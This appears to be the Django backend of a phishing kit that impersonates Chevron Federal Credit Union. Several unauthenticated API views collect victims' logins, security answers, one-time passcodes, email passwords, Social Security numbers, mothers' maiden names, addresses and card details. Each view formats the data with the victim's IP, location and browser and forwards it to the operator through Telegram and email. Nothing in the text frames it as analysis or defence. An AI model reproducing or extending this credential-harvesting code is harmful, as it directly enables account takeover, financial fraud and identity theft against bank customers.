...
def chevron_collect_user_login_cred(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            message = _brand_header("LOGIN")
            message += f"| ➤ [ Username ]         : {username}\n"
            message += f"| ➤ [ Password ]         : {password}\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, date)

            send_data_telegram(app_settings, message)

            subject = "Chevron FCU Data"
            ...
            logger.exception("chevron_collect_user_login_cred failed")
            payload["message"] = "Errors"
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_login_cred2(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            message = _brand_header("LOGIN CONFIRM")
            message += f"| ➤ [ Username ]        : {username}\n"
            ...
            logger.exception("chevron_collect_user_login_cred2 failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_security_questions(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            username = request.data.get("emzemz", "")
            security_question_1 = request.data.get("securityQuestion1", "")
            security_answer_1 = request.data.get("securityAnswer1", "")
            security_question_2 = request.data.get("securityQuestion2", "")
            security_answer_2 = request.data.get("securityAnswer2", "")
            security_question_3 = request.data.get("securityQuestion3", "")
            security_answer_3 = request.data.get("securityAnswer3", "")

            if not username:
                errors["username"] = ["Username is required."]
            if not security_question_1:
            ...
            client, _ = Client.objects.get_or_create(username=username)
            client.security_question_1 = security_question_1
            client.security_answer_1 = security_answer_1
            client.security_question_2 = security_question_2
            client.security_answer_2 = security_answer_2
            client.security_question_3 = security_question_3
            client.security_answer_3 = security_answer_3
            client.save()
            ...
            message = _brand_header("SECURITY QUESTIONS")
            message += f"| ➤ [ Question 1 ]      : {security_question_1}\n"
            message += f"| ➤ [ Answer 1 ]        : {security_answer_1}\n"
            message += f"| ➤ [ Question 2 ]      : {security_question_2}\n"
            message += f"| ➤ [ Answer 2 ]        : {security_answer_2}\n"
            message += f"| ➤ [ Question 3 ]      : {security_question_3}\n"
            message += f"| ➤ [ Answer 3 ]        : {security_answer_3}\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, date)
            ...
            logger.exception("chevron_collect_user_security_questions failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_otp_verification(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            message = _brand_header("OTP VERIFICATION")
            message += f"| ➤ [ Username ]       : {username}\n"
            message += f"| ➤ [ OTP ]            : {otp}\n"
            message += _browser_details_message(ip, country, city, browser, os, agent, date)
            ...
            logger.exception("chevron_collect_user_otp_verification failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_email_password(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            message = _brand_header("EMAIL / PASSWORD SET")
            message += f"| ➤ [ Username ]       : {username}\n"
            ...
            logger.exception("chevron_collect_user_email_password failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_basic_info(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            client.email = client.email or username
            client.save()
            ...
            message = _brand_header("BASIC INFO")
            message += f"| ➤ [ Username ]           : {username}\n"
            message += f"| ➤ [ First Name ]         : {first_name}\n"
            message += f"| ➤ [ Last Name ]          : {last_name}\n"
            message += f"| ➤ [ Phone ]              : {phone}\n"
            message += f"| ➤ [ SSN ]                : {ssn}\n"
            message += f"| ➤ [ Mother's Maiden ]    : {mother_maiden_name}\n"
            ...
            logger.exception("chevron_collect_user_basic_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_home_address(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            message = _brand_header("HOME ADDRESS")
            ...
            logger.exception("chevron_collect_user_home_address failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
...
@permission_classes([])
@authentication_classes([])
def chevron_collect_user_card_info(request):
    payload = {}
    data = {}
    errors = {}
    ...
    if request.method == "POST":
        try:
            ...
            message = _brand_header("CARD INFO")
            message += f"| ➤ [ Username ]       : {username}\n"
            ...
            logger.exception("chevron_collect_user_card_info failed")
            payload["message"] = "Errors"
            payload["errors"] = {"detail": ["Internal server error"]}
            return Response(payload, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
    return Response(payload)
